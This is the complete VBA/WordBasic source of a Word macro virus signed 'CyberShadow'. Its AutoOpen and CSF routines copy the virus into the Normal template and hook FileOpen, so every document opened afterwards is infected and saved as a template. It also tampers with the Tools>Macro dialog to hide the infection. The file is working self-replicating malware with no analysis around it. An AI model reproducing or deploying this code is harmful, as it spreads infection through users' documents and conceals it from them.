   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim c
   Dim i
   Dim b
   Dim a
   Dim a_$
   Dim b_$
   On Error GoTo -1: On Error GoTo ops
    c = 0
    For i = 1 To WordBasic.CountMacros(0, 0)
     If WordBasic.[MacroName$](i, 0, 0) = "CS" Then c = 10
    Next i
    If c = 10 Then GoTo ops
    Rem Stealth Wishes by CyberShadow...
    Rem Thanks to SGWW !
    b = WordBasic.FontSize()
    WordBasic.FontSize 20
    a = WordBasic.FontSize()
    WordBasic.FontSize 25
    c = WordBasic.FontSize()
    a_$ = "Fucking "
    If c - a = 5 Then a_$ = "Tools"
    c = Asc("M")
    b_$ = "acro"
    a_$ = a_$ + Chr(c) + b_$
    WordBasic.FontSize b
    WordBasic.ToolsMacro Name:="CyberShadow", Edit:=1, Show:=0, Description:="", NewName:=""
    WordBasic.Insert "MacroCopy FileName$() + " + Chr(34) + ":AutoOpen" + Chr(34) + "," + Chr(34) + "Normal:CS" + Chr(34)
    WordBasic.InsertPara
    WordBasic.Insert "MacroCopy FileName$() + " + Chr(34) + ":CSF" + Chr(34) + "," + Chr(34) + "Normal:FileOpen" + Chr(34)
    WordBasic.InsertPara
    WordBasic.Insert a_$
    WordBasic.Insert " .Name = " + Chr(34)
    WordBasic.Insert a_$
    WordBasic.Insert Chr(34) + ", .Edit, .Show = 0, .Description = " + Chr(34) + "??????, ????????, ???????? ??? ????????? ???????" + Chr(34) + ", .NewName = " + Chr(34) + Chr(34)
    WordBasic.InsertPara
    WordBasic.Insert "LineUp 2"
    WordBasic.InsertPara
    WordBasic.Insert "EndOfLine"
    WordBasic.InsertPara
    WordBasic.Insert "InsertPara"
    WordBasic.InsertPara
    WordBasic.Insert "Insert " + Chr(34) + "if dlg.name<>" + Chr(34) + " + Chr$(34) + " + Chr(34) + "CyberShadow" + Chr(34) + " + Chr$(34) + " + Chr(34) + " then goto fuck" + Chr(34)
    WordBasic.InsertPara
    WordBasic.Insert "LineDown 2"
    WordBasic.InsertPara
    WordBasic.Insert "InsertPara"
    WordBasic.InsertPara
    WordBasic.Insert "Insert " + Chr(34) + "fuck: " + Chr(34)
    WordBasic.InsertPara
    WordBasic.Insert "LineUp 1"
    WordBasic.InsertPara
    WordBasic.Insert "DocClose 1"
    WordBasic.InsertPara
    WordBasic.DocClose 1
    WordBasic.ToolsMacro Name:="CyberShadow", Run:=1, Show:=0, Description:="", NewName:=""
    WordBasic.ToolsMacro Name:="CyberShadow", Show:=0, Delete:=1
   ops:
   End Sub

   Attribute VB_Name = "CSF"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "???????? ????????????? ????????? ??? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.CSF.MAIN"
   Dim s
   Dim i
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
    On Error GoTo -1: On Error GoTo ops
    WordBasic.CurValues.FileOpen dlg
    WordBasic.Dialog.FileOpen dlg
    WordBasic.FileOpen dlg
    s = 100
    For i = 1 To WordBasic.CountMacros(1, 0, 0)
     If WordBasic.[MacroName$](i, 1) = "CSF" Then s = 1
    Next i
    If s = 1 Then GoTo ops
    Rem Stealth Wishes by CyberShadow...
    Rem Thanks to SGWW !
    WordBasic.ToolsMacro Name:="CyberShadow", Edit:=1, Show:=0, Description:="", NewName:=""
    WordBasic.Insert "MacroCopy " + Chr(34) + "Normal:CS" + Chr(34) + ", FileName$() + " + Chr(34) + ":AutoOpen" + Chr(34)
    WordBasic.InsertPara
    WordBasic.Insert "MacroCopy " + Chr(34) + "Normal:FileOpen" + Chr(34) + ", FileName$() + " + Chr(34) + ":CSF" + Chr(34)
    WordBasic.DocClose 1
    WordBasic.ToolsMacro Name:="CyberShadow", Run:=1, Show:=0, Description:="", NewName:=""
    WordBasic.ToolsMacro Name:="CyberShadow", Show:=0, Delete:=1
    WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
   ops:
   End Sub
